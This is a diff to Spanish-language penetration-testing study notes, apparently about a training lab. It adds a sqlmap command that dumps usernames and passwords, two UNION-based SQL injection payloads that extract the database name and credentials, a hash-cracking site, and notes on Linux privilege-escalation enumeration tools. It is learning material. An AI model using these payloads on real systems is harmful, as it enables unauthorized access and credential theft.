@@ -10,7 +10,7 @@ Es importante tener en cuenta que el tipo de payload utilizado en un ataque depe
 [[explotacion manual]]
 [[explotacion automatizada]]
 
-por ejemplo se puede hacer uso de la siguiente explotacion automatizada con sqlmap:
+por ejemplo se puede hacer uso de la siguiente explotacion automatizada con [[sqlmap]]:
 ```bash
 sqlmap -r request.req -p searchitem --batch -D sqltraining -T users -C username, password --dump
 ```
@@ -21,3 +21,27 @@ sqlmap -r request.req -p searchitem --batch -D sqltraining -T users -C username,
 - `-T users` → tabla objetivo
 - `-C username,password` → columnas a extraer
 - `--dump` → muestra los datos
+
+query manual de sqli:
+test' union select 1,2,database(),user(),5 from information_schema.schemata-- - 
+- `1, 2, 5` → Valores de relleno para coincidir con la cantidad de columnas
+- `database()` → Muestra el **nombre de la base de datos actual**
+- `user()` → Muestra el **usuario de la base de datos**
+- `information_schema.schemata` → Tabla del sistema con metadatos
+- `-- -` → Comenta el resto de la query original
+
+test' union select 1, username, password, 4, 5 from users-- -
+- `username` → Columna con nombres de usuario
+- `password` → Columna con contraseñas (normalmente hasheadas)
+- `1, 4, 5` → Columnas de relleno
+- `FROM users` → Tabla objetivo
+- `-- -` → Anula el resto de la query original
+
+hashed.com -> web que sirve para descifrar valores hasheados
+
+### enumeracion del sistema
+La enumeración es un proceso crítico para identificar por ejemplo vías potenciales de poder elevar nuestros privilegios de usuario, así como para comprender la estructura del sistema objetivo y encontrar información útil para futuros ataques.
+
+[[LSE]] (linux smart enumeration): sirve para ver si un sistema linux es inseguro
+
+Pspy: es una herramienta de enumeración de procesos que permite a los atacantes observar los procesos y comandos que se ejecutan en el sistema objetivo a intervalos regulares de tiempo. Pspy es una herramienta útil para la detección de malware y backdoors, así como para la identificación de procesos maliciosos que se ejecutan en segundo plano sin la interacción del usuario\.
